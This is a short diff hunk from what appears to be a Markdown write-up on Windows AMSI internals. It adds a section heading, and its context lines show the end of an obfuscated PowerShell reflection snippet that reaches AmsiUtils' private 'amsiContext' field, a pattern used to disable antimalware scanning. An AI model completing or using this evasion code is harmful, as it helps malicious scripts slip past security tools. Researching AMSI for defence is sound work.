@@ -18,3 +18,5 @@ This means that all the functionality of AMSI is available in that process's add
 0041')+'msiUtils').GetField("ams"+[regex]::Unescape('\u0069')+"Context",'Non
 Public,Static').GetValue($null)
 ```
+
+## AMSI under the Hood
